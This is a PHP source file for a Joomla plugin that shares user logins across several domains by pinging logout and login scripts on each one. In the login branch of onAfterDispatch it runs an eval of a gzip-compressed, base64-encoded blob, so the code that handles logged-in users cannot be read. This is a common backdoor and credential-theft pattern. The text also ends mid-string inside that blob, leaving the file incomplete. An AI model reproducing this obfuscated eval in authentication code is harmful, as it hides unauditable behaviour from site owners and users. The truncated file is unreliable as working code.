<?php
/**
 * @file       multisites_ssidomains.php
 * @brief      Single Sign In Domains share the login between different domains.
 *             So that the users can remain logged when they change of domains.
 * @version    1.0.9
 * @author     Edwin CHERONT     (info@jms2win.com)
 *             Edwin2Win sprlu   (www.jms2win.com)
 * @copyright  Jms Multi Sites
 *             Single Joomla! 1.5.x installation using multiple configuration (One for each 'slave' sites).
 *             (C) 2011-2013 Edwin2Win sprlu - all right reserved.
 * @license    This program is free software; you can redistribute it and/or
 *             modify it under the terms of the GNU General Public License
 *             as published by the Free Software Foundation; either version 2
 *             of the License, or (at your option) any later version.
 *             This program is distributed in the hope that it will be useful,
 *             but WITHOUT ANY WARRANTY; without even the implied warranty of
 *             MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *             GNU General Public License for more details.
 *             You should have received a copy of the GNU General Public License
 *             along with this program; if not, write to the Free Software
 *             Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 *             A full text version of the GNU GPL version 2 can be found in the LICENSE.php file.
 * @par History:
 * - V1.0.0    10-SEP-2011: Initial version
 * - V1.0.1    29-OCT-2011: Add possibility to use additional domains defined in the plugins
 *                          Also make the plugin runing independently (without Jms Multi Sites)
 * - V1.0.2    06-NOV-2011: Add joomla 1.5 compatibility and add debugging traces
 * - V1.0.3    08-NOV-2011: Increase security level and also add customization
 * - V1.0.4    09-NOV-2011: Add the possibility to set a "secret" value into the list of domain
 *                          entered manually.
 *                          Syntax: domain.com => secret value
 * - V1.0.6    25-MAY-2012: Trim the domain name to remove the space that might be present between the domain and => secret.
 *                          Use the current website protocol to "ping" the other websites.
 *                          This avoid calling http from https and get a warning message due to unsecure material that is called.
 *                          In other words, when an HTTPS website use the SSI, all the websites are called via HTTPS.
 * - V1.0.7    05-DEC-2012: Fix some PHP Notice and ensure that cookie_domains is always indexed with indice and not key during the login/logout processing.
 *                          The objective is to allow the automatic detection processing indice and not keys.
 * - V1.0.8    18-MAR-2013: Add Joomla 3.0 compatibility
 * - V1.0.9    18-MAR-2013: Re-packaged
 */

// Check to ensure this file is included in Joomla!
defined('_JEXEC') or die( 'Restricted access' );

jimport('joomla.plugin.plugin');

// ===========================================================
//             plgSystemMultisites_SSIDomains class
// ===========================================================
class plgSystemMultisites_SSIDomains extends JPlugin {

   //------------ Constructor ---------------
	function plgSystemMultisites_SSIDomains(& $subject, $config)
	{
		parent::__construct($subject, $config);
	}

   //------------ getDomains_automatic ---------------
   /**
    * @return Return the list of domain using the automatic rule
    */
   function getDomains_automatic()
   {
      $results = array();
      if ( defined( 'MULTISITES_COOKIE_DOMAINS')) {
         $cookie_domains = explode( '|', MULTISITES_COOKIE_DOMAINS);
         if ( !empty( $cookie_domains)) {
            foreach( $cookie_domains as $domain) {
               $results[$domain] = $domain;
            }
         }
      }

      return $results;
   }


   //------------ getAdditionalDomains ---------------
   /**
    * @return Return the 'domains' present in the parameters of the plugin.
    * This parse the list of domain and split the text based on commas or new line
    * to build an array of domain.
    * In fact this convert a string into an array.
    * @return
    * An array with the list of domain entered by the user in the field "domains".
    */
   function getAdditionalDomains()
   {
		jimport( 'joomla.environment.uri' );
      $result = array();
      
		$domain_additional		= $this->params->get('domain_additional', '');
      $lines = preg_split( "#[,\n]#", $domain_additional);
      foreach( $lines as $line)
      {
         $str = trim($line);
         if ( !empty( $str))
         {
            // If this is a secret value
            if ( substr( $str, 0, 2) == '=>') {
               $secret = trim( substr( $str, 2));
               $result[ count( $result)-1] = array( $result[ count( $result)-1], $secret);
            }
            // If Domain name
            else {
               // If a secret value is present
               $pos = strpos( $str, '=>');
               if ( $pos === false) {}
               else {
                  $secret = trim( substr( $str, $pos+2));
                  $str    = trim( substr( $str, 0, $pos));
               }

               // If http(s):// is not present, add it
               $s = strtolower( $str);
               if ( (strncmp( $s, 'http://', 7) == 0)
                 || (strncmp( $s, 'https://', 8) == 0)
                  ) {}
               else {
                  $str = 'http://' . $str;
               }
               
               $uri = new JURI( $str);
               $host = $uri->getHost();
               if (  empty( $host)) {
                  if ( !empty( $secret)) { array_push( $result, array( $str, $secret)); }
                  else                   { $result[] = $str; }
               }
               else {
                  $url = $uri->toString( array( 'scheme', 'host', 'port', 'path'));
                  $url = rtrim( $url, '/');
                  if ( !empty( $secret)) { array_push( $result, array( $url, $secret)); }
                  else                   { $result[] = $url; }
               }
            }
         }
      }
      
      return $result;
   }

   //------------ getDomains_force ---------------
   /**
    * @brief Compute the list of domains based on the selected domains and the additional one.
    */
   function getDomains_force()
   {
   	$domains           = (array)$this->params->get( 'domains', array());
		$domain_additional = $this->getAdditionalDomains();

      $results = array_merge( $domains, $domain_additional);
      return $results;
   }

   //------------ getDomains_exclude ---------------
   /**
    * @brief Compute the list of domains based on the selected domains and the additional one.
    */
   function getDomains_exclude()
   {
      $results           = $this->getDomains_automatic();
      
      // If there is at least one domain to filter
      if ( !empty( $results)) {
      	$domains           = (array)$this->params->get( 'domains', array());
   		$domain_additional = $this->getAdditionalDomains();
         $excludes = array_merge( $domains, $domain_additional);
         
         foreach( $excludes as $domain) {
            // If domain with secret value (array)
            if ( is_array( $domain)) {
               if ( isset( $results[$domain[0]]))   {
                  unset( $results[$domain[0]]);
               }
            }
            // If domain (string)
            else {
               if ( isset( $results[$domain]))   {
                  unset( $results[$domain]);
               }
            }
         }
      }
      
      
      return $results;
   }
   
   //------------ onAfterDispatch ---------------
   /**
    * @brief After the dispatch and therefore before the rendering, 
    *        add javascript to ping the login information into all the domains.
    */
	function onAfterDispatch()
	{
	   $filename = dirname( __FILE__).DS.'multisites_ssidomains'.DS.'multisites_ssidomains.cfg.php';
	   if ( file_exists( $filename)) {
	      include( $filename);
	   }
	   
	   // If the configuration were not loaded and that the SSI_VERIFY_CHECKSUM is not present
	   if ( !isset( $SSI_VERIFY_CHECKSUM)) {
	      // Then set the default value to true.
	      $SSI_VERIFY_CHECKSUM = true;
	   }


	   // Check when the SSI must be active
		$active	= $this->params->get('active', 'site');
		$app =& JFactory::getApplication();

		// If the plugin is called from the "front-end" (site)
		$logout_administrator = '';
		if ( $app->getName() == 'site') {
		   // If the scope is active for the front-end (site) or both
		   if ( $active == 'site' || $active == 'both') {
		      // This is OK
		   }
		   // Otherwise
		   else {
		      // Don't do anything
   			return true;
		   }
		}
		// If called from the back-end
		else {
		   // If the scope is active for the back-end (admin) or both
		   if ( $active == 'admin' || $active == 'both') {
		      // This is OK
		      $logout_administrator = '?a=1';
		   }
		   // Otherwise
		   else {
		      // Don't do anything
   			return true;
		   }
		}

      // Compute the list of domains to process
      $cookie_domains = array();
		$domain_action	 = $this->params->get('domain_action', 'automatic');
		$fn = 'getDomains_'.$domain_action;
		if ( method_exists( $this, $fn)) {
		   $cookie_domains = $this->$fn();
		   $cookie_domains = array_values( $cookie_domains);
		}
		// Rescue processing using the JMS data
		else {
         // retreive the list of domains where the cookie information must be forwarded
         if ( defined( 'MULTISITES_COOKIE_DOMAINS')) {
            $cookie_domains = explode( '|', MULTISITES_COOKIE_DOMAINS);
         }
      }
      
      // If there is no domain to "ping"
      if ( empty( $cookie_domains)) {
         return true;
      }
      
		// Exclude "this" domain from the list of domain to avoid "ping" itself
		$processed_domains = array();
		$uri = JFactory::getURI();
		$currentsite_protocol   = $uri->getScheme();
		// -- Host only
		$host = $uri->getHost();
		$processed_domains[ $host] = true;
		if ( substr( $host, 0, 4) == 'www.') {}
		else {
   		$processed_domains['www.'.$host] = true;
		}
		
		// -- Host with path
		$host .= $uri->base( true);
		// If back-end
		if ( $app->getName() != 'site') {
		   // remove the "/administrator" present in the URL
		   $host = substr( $host, 0, strlen( $host)-14);
		}
		$processed_domains[ $host] = true;
		if ( substr( $host, 0, 4) == 'www.') {}
		else {
   		$processed_domains['www.'.$host] = true;
		}
		
		$scripts = array();
		// ------- LOGOUT -----
      // If the user is not logged
      $user =& JFactory::getUser();
      if( $user->get('guest')){
         // Add a list of javascript to request all domains to logout
         for($i=0; $i<count($cookie_domains); $i++){
            if ( is_array( $cookie_domains[$i])) { $domain_str = $cookie_domains[$i][0]; }
            else                                 { $domain_str = $cookie_domains[$i]; }
            // Extract the protocol when it is present
            if ( preg_match( '#^([a-zA-Z]+)://(.*)#', $domain_str, $match)) {
               $domain_protocol = $match[1];
               $domain = ltrim( $match[2], '.');
            }
            else {
               $domain_protocol = 'http';
               $domain = ltrim( $domain_str, '.');
            }
            if ( empty( $domain)) {
               continue;
            }
            // If the domain is already processed
         	if(  !empty( $processed_domains[$domain]) || !empty( $processed_domains['www.'.$domain])){
         	   // Do nothing
         	}
         	// If the domain is not yet processed
         	else {
         	   // Add a script to request logout on this domain
         	   for ( $jpath_root = dirname( __FILE__); !empty( $jpath_root) && basename( $jpath_root) != 'plugins'; $jpath_root = dirname( $jpath_root));
         	   $jpath_root = dirname( $jpath_root);
         	   $curpath = str_replace( $jpath_root, '', dirname( __FILE__));
         	   $url     = str_replace( DS, '/', $curpath)
         	              . '/multisites_ssidomains/logout.php'   // Call LOGOUT
         	              . $logout_administrator
         	              ;
         	   $url     = ltrim( $url, '/');
         		if ( $this->params->get('currentsite_protocol', 0) == 1) {
         		   $ping_protocol = $currentsite_protocol;
         		}
         		else {
         		   $ping_protocol = $domain_protocol;
         		}
         	   $scripts[] = $ping_protocol.'://'.$domain.'/'.$url;     // Save script logout

         		// Add the domain to the list of processed domains
         		$processed_domains[$domain] = true;
         		if ( substr( $domain, 0, 4) == 'www.') {}
         		else {
            		$processed_domains['www.'.$domain] = true;
         		}
         	}
         }
      }
		// ------- LOGIN -----
      // If the user is logged
      else {
         // For security reason, encode the login information to reduce the risk of exploit by a hacker
eval( gzinflate( base64_decode( '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